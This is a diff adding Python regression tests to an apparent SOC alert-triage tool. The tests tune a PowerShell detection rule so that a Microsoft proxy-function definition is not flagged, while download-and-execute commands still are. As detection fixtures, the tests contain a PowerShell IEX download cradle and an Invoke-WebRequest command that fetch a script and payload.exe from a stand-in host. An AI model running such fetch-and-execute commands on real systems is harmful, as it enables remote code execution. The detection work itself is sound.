@@ -122,6 +122,77 @@ class TriageRulePackTests(unittest.TestCase):
         self.assertEqual(result["status"], "review")
         self.assertNotIn("policyRule", result)
 
+class FalsePositiveTests(unittest.TestCase):
+    """Regression tests for the 2026-08-24 false positive.
+
+    Windows automatic maintenance loaded a module that *defines* proxy
+    functions named Invoke-Expression and Invoke-Command. The old SOC-PS-003
+    matched the bare string "invoke-expression", scored it 98, and put routine
+    patching at the top of the investigation queue. Worse, that module exists
+    to block Invoke-Expression in scripts, so a defensive control was being
+    reported as an attack.
+    """
+
+    DEFINITION_SCRIPT = """\"Creating Scriptblock text (1 of 1):
+function Test-Caller {
+    param([Parameter(Mandatory=$true)][System.Management.Automation.CallStackFrame[]]$CallStack)
+    if ($location -eq '<No file>') { throw 'Invoke-Expression cannot be used in a script' }
+}
+function Invoke-Expression {
+    [CmdletBinding(HelpUri='https://go.microsoft.com/fwlink/?LinkID=2097030')]
+param([Parameter(Mandatory=$true, Position=0, ValueFromPipeline=$true)][string]${Command})
+\""""
+
+    def test_function_definition_is_not_a_candidate(self):
+        result = server.triage_alert(
+            alert(command=self.DEFINITION_SCRIPT, rule_id="91823", level=14,
+                  event_id="4104", channel="Microsoft-Windows-PowerShell/Operational")
+        )
+        self.assertNotEqual(result["status"], "candidate")
+        self.assertNotEqual(result.get("policyRule"), "SOC-PS-003")
+
+    def test_function_definition_stays_visible_for_review(self):
+        # Suppressing it entirely would be the opposite mistake: Wazuh rated it
+        # level 14, so an analyst must still be able to find it.
+        result = server.triage_alert(
+            alert(command=self.DEFINITION_SCRIPT, rule_id="91823", level=14,
+                  event_id="4104", channel="Microsoft-Windows-PowerShell/Operational")
+        )
+        self.assertEqual(result["status"], "review")
+
+    def test_real_download_cradle_still_fires(self):
+        result = server.triage_alert(
+            alert(command="powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')\"")
+        )
+        self.assertEqual(result["status"], "candidate")
+        self.assertEqual(result["policyRule"], "SOC-PS-003")
+
+    def test_invoke_webrequest_still_fires(self):
+        result = server.triage_alert(
+            alert(command="powershell -c \"Invoke-WebRequest http://10.0.0.5/payload.exe -OutFile p.exe\"")
+        )
+        self.assertEqual(result["status"], "candidate")
+        self.assertEqual(result["policyRule"], "SOC-PS-003")
+
+    def test_bare_iex_is_review_not_candidate(self):
+        # Executing a string is a far weaker signal than fetching one.
+        # rule_id 99999 keeps this isolated to SOC-PS-005: the default 92027
+        # independently matches SOC-WAZUH-001 (candidate, 85), which would
+        # legitimately outrank it.
+        result = server.triage_alert(
+            alert(command="powershell -c \"Invoke-Expression $payload\"", rule_id="99999")
+        )
+        self.assertEqual(result["status"], "review")
+        self.assertEqual(result["policyRule"], "SOC-PS-005")
+
+    def test_wazuh_high_signal_rule_still_outranks_weak_text_match(self):
+        # Documents the interaction the test above isolates around.
+        result = server.triage_alert(
+            alert(command="powershell -c \"Invoke-Expression $payload\"", rule_id="92027")
+        )
+        self.assertEqual(result["status"], "candidate")
+        self.assertEqual(result["policyRule"], "SOC-WAZUH-001")
+
 
 if __name__ == "__main__":
     unittest.main()
